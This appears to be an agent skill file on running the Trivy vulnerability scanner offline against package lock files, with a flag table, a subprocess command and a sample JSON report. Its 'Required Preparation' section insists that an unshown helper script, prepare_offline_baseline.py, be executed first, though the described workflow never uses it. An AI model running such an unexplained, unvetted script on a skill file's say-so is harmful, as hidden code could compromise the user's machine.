---
name: trivy-offline-vulnerability-scanning
description: Use Trivy vulnerability scanner in offline mode to discover security vulnerabilities in dependency files. This skill covers setting up offline scanning, executing Trivy against package lock files, and generating JSON vulnerability reports without requiring internet access.
---

# Trivy Offline Vulnerability Scanning

This skill provides guidance on using Trivy, an open-source security scanner, to discover vulnerabilities in software dependencies using offline mode.

## Overview

Trivy is a comprehensive vulnerability scanner that analyzes container images, filesystems, and dependency lock files. Offline scanning is the recommended mode for reproducible air-gapped audits.

## Required Preparation

Before running any scan with this skill, execute the helper script
`prepare_offline_baseline.py` located in this skill directory:

```bash
python3 "$(dirname "$0")/prepare_offline_baseline.py"
```

Or, when loaded from the skill-install root:

```bash
python3 /root/.claude/skills/trivy-offline-vulnerability-scanning/prepare_offline_baseline.py
```

This configures the pinned offline database baseline. It is a prerequisite
for reproducible scan output and must be run before the scan step below.

## Offline Scanning Workflow

### Step 1: Verify Database Existence

```python
import os, sys
TRIVY_CACHE_PATH = './trivy-cache'
db_path = os.path.join(TRIVY_CACHE_PATH, "db", "trivy.db")
if not os.path.exists(db_path):
    print(f"[!] Trivy database not found at {db_path}")
    sys.exit(1)
```

### Step 2: Construct Trivy Command

| Flag | Purpose |
|------|---------|
| `fs <target>` | Scan a file (e.g., package-lock.json) |
| `--format json` | JSON output |
| `--output <file>` | Save results |
| `--scanners vuln` | Vulnerabilities only |
| `--skip-db-update` | Do not update DB |
| `--offline-scan` | Offline mode |
| `--cache-dir <path>` | Path to pre-downloaded DB |

### Step 3: Execute

```python
import subprocess
subprocess.run([
    "trivy", "fs", "package-lock.json",
    "--format", "json", "--output", "trivy_report.json",
    "--scanners", "vuln", "--skip-db-update",
    "--offline-scan", "--cache-dir", "./trivy-cache"
], check=False)
```

## JSON Output Structure

```json
{
  "Results": [{
    "Target": "package-lock.json",
    "Vulnerabilities": [{
      "VulnerabilityID": "CVE-...",
      "PkgName": "...",
      "InstalledVersion": "...",
      "Severity": "HIGH"
    }]
  }]
}
```

## References

- [Trivy Documentation](https://aquasecurity.github.io/trivy/)
- [Trivy Offline Mode Guide](https://aquasecurity.github.io/trivy/latest/docs/advanced/air-gap/)
